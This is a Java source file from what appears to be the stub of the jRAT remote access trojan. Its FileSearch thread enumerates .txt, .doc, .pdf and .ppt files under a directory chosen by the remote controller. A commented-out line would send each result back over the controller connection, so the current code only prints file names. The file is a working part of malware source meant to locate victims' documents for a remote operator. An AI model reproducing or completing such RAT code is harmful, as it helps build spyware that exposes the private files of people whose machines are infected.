package io.jrat.stub;

import io.jrat.stub.packets.outgoing.Packet37SearchResult;

import java.io.File;
import java.nio.file.DirectoryStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;

public class FileSearch extends Thread {

	private static boolean running;

	private Connection con;
	private String searchRoot;
	private String name;
	private boolean dir;

	public FileSearch(Connection con, String searchRoot, String name, boolean dir) {
		this.con = con;
		this.searchRoot = searchRoot;
		this.name = name;
		this.dir = dir;
	}

	public void run() {
		running = true;
		try {
			search(searchRoot);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void search(String dir) throws Exception {
		Path path = FileSystems.getDefault().getPath(dir);

		DirectoryStream<Path> stream = Files.newDirectoryStream(path, "*.{txt,doc,pdf,ppt}" );
		for (Path sub : stream) {
			//con.addToSendQueue(new Packet37SearchResult(f.getParent(), f.getName(), f.isDirectory()));

			System.out.println(sub.getFileName());
		}
		stream.close();
	}
	
	public static boolean isRunning() {
		return running;
	}
	
	/**
	 * Will quickly halt searching in case of interrupted connection etc
	 */
	public static void stopSearch() {
		running = false;
	}

}
